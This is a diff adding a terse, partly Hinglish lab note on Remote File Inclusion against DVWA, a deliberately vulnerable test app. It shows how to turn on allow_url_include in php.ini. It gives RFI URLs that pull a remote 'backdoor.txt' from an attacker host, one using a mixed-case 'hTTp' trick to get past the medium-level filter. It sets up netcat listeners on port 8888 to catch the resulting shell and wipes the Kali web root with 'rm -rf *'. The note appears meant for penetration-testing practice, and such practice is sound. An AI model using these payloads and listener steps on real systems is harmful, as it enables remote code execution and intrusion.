@@ -1,0 +1,42 @@
+RFI 
+
+cd /etc/php5/cgi 
+ls
+nano php.ini
+
+to search in nano file  ----> ctrl + W 
+search {allow url}
+ allow_url_fopen = on 
+ allow_url_include = on 
+ ctrl + O --------> write 
+ ctrl + X --------> exit 
+
+
+\settting update karne ke badd 
+/etc/init.d/apache2 restart 
+
+
+
+VICTIM SITE { ?page=include.php }
+low ====> http://192.168.147.131/dvwa/vulnerabilities/fi/?page=http://192.168.147.130/backdoor.txt
+
+medium ====> http://192.168.147.131/dvwa/vulnerabilities/fi/?page=hTTp://192.168.147.130/backdoor.txt
+
+nc -nlvp 8888
+nc -vv -l -p 8888
+
+
+-nlvp: These are command-line options specific to the netcat utility:
+
+-n ensures that numeric addresses are not resolved to hostnames, making the output easier to read.
+-l tells netcat to listen for incoming connections rather than initiating them.
+-v enables verbose output, providing more detailed information during the connection.
+-p 8888 specifies the port number on which netcat should listen. In this case, it is set to port 8888, but you can choose any available port number.
+
+
+
+
+Apache service in KALI 
+service apache2 start
+cd /var/www/html
+rm -rf * 
